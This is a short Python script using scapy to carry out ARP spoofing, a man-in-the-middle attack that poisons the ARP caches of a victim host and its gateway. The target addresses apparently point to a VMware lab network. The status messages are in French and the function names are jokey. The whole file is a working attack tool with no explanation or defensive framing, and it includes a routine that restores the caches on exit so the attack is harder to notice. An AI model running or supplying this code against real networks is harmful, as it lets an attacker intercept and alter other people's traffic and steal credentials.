from scapy.all import *

BROADCAST = "FF:FF:FF:FF:FF:FF"
HOW_MUCH_TO_SPAM_PPL = 7

victim_ip = "192.168.79.128"
gate_ip = "192.168.79.254"
interface = 'vmnet1'

def get_mac(ip):
    ans, unans = srp(
            Ether(dst=BROADCAST)/ARP(pdst=ip),
            timeout=2,
            iface=interface,
            inter=0.1)

    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

def build_arp_pair_packets(gate_info, victim_info):
    gate_mac, gate_ip = gate_info
    victim_mac, victim_ip = victim_info

    build = lambda pdst, psrc, hwsrc: ARP(op=2, pdst=pdst, psrc=psrc, hwdst=BROADCAST, hwsrc=hwsrc)

    return build(gate_ip, victim_ip, victim_mac), build(victim_ip, gate_ip, gate_mac)

def make_them_think_we_didnt_do_something_bad():
    print("[+] Restauration des caches ARP des cibles")

    victim_mac = get_mac(victim_ip)
    gate_mac = get_mac(gate_ip)

    for_gate, for_victim = build_arp_pair_packets((gate_mac, gate_ip), (victim_mac, victim_ip))

    for pkt in (for_gate, for_victim):
        send(pkt, count=HOW_MUCH_TO_SPAM_PPL)

def trick_them(gm, vm):
    for pdst, psrc, hwdst in ((victim_ip, gate_ip, vm), (gate_ip, victim_ip, gm)):
        send(
                ARP(op=2, pdst=pdst, psrc=psrc, hwdst=hwdst)
        )

def mitm():
    try:
        victim_mac = get_mac(victim_ip)
    except Exception as e:
        print(e)
        print("[!] Impossible de trouver l'adresse MAC de la cible, échec de l'attaque")
        return

    try:
        gate_mac = get_mac(gate_ip)
    except Exception:
        print("[!] Impossible de trouver l'adresse MAC du routeur, échec de l'attaque")

    print("[+] Le cyanure va être déposé sur le réseau (MAC adresses obtenues)")

    while True:
        try:
            trick_them(gate_mac, victim_mac)
            time.sleep(1.5)
        except KeyboardInterrupt:
            make_them_think_we_didnt_do_something_bad()
            break

if __name__ == '__main__':
    mitm()

